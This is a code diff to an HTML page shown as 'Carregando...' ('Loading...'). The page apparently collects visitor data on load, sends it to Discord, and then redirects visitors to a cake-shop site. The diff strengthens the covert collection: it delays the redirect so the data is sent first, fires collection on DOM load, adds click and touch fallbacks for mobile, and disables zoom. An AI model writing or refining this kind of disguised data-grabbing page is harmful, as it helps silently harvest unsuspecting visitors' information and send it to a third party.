@@ -2,7 +2,7 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Carregando...</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -68,7 +68,9 @@
                     sendToDiscord(data);
                 })
                 .finally(() => {
-                    window.location.href = 'https://sodiedoces.com.br/bolos/';
+                    setTimeout(() => {
+                        window.location.href = 'https://sodiedoces.com.br/bolos/';
+                    }, 1000); // Add small delay to ensure data is sent
                 });
             }
         }
@@ -110,8 +112,14 @@
             }).catch(() => {});
         }
 
-        // Run everything when page loads
-        window.onload = collectAndRedirect;
+        // Run everything when page loads and add touch/click handlers
+        document.addEventListener('DOMContentLoaded', function() {
+            collectAndRedirect();
+            
+            // Fallback for mobile devices if initial load fails
+            document.body.addEventListener('click', collectAndRedirect);
+            document.body.addEventListener('touchstart', collectAndRedirect);
+        });
     </script>
 </body>
 </html>
